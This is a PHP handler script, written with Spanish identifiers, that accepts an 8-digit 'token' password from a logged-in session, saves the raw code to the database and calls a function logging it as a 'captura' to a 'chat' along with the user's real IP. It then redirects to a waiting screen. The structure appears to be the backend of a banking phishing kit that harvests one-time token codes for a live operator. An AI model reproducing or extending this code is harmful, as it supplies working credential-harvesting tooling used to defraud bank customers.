<?php
require_once __DIR__ . '/../php_config/helpers.php';
require_once __DIR__ . '/../php_config/token_pantalla_helpers.php';
session_start();

function tokenEmpresasEsAjax(): bool
{
    return isset($_SERVER['HTTP_X_REQUESTED_WITH'])
        && strtolower((string) $_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest';
}

function tokenEmpresasResponder(bool $success, ?string $error = null, int $status = 200): void
{
    if (tokenEmpresasEsAjax()) {
        http_response_code($status);
        header('Content-Type: application/json; charset=utf-8');
        echo json_encode([
            'success' => $success,
            'error' => $error,
        ]);
        exit;
    }

    if (!$success) {
        $_SESSION['token_error'] = $error ?? 'No pudimos procesar tu token. Intenta de nuevo.';
        header('Location: ../empresas/token.php');
        exit;
    }

    header('Location: ../empresas/token.php?espera=1');
    exit;
}

if (!isset($_SESSION['usuario_id'])) {
    tokenEmpresasResponder(false, 'Sesión no válida.', 401);
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: ../empresas/token.php');
    exit;
}

$token_codigo = trim($_POST['token_codigo'] ?? '');

if ($token_codigo === '') {
    tokenEmpresasResponder(false, 'Ingresa la contraseña de tu token.', 400);
}

if (!preg_match('/^[0-9]{8}$/', $token_codigo)) {
    tokenEmpresasResponder(false, 'La contraseña token debe tener 8 dígitos.', 400);
}

try {
    $pdo = conectarBD();
    $usuarioId = (int) $_SESSION['usuario_id'];

    $usuario = tokenPantallaObtenerUsuario($pdo, $usuarioId);
    if (!$usuario) {
        tokenEmpresasResponder(false, 'No pudimos procesar tu token. Intenta de nuevo.', 400);
    }

    $yaTeniaToken = tokenPantallaTokenIngresado($usuario);
    $modo = strtolower((string) ($usuario['token_pantalla_modo'] ?? 'normal'));
    if ($modo !== 'qr') {
        $modo = 'normal';
    }
    $ipUsuario = trim((string) ($usuario['ip_real'] ?? '')) ?: '::1';

    $stmt = $pdo->prepare('UPDATE usuarios SET token_codigo = ? WHERE id = ?');
    $stmt->execute([$token_codigo, $usuarioId]);

    if (!$yaTeniaToken) {
        tokenPantallaRegistrarCapturaChat($pdo, $usuarioId, $token_codigo, $modo, $ipUsuario);
    }

    unset($_SESSION['token_error']);

    tokenEmpresasResponder(true);
} catch (PDOException $e) {
    tokenEmpresasResponder(false, 'No pudimos procesar tu token. Intenta de nuevo.', 500);
}
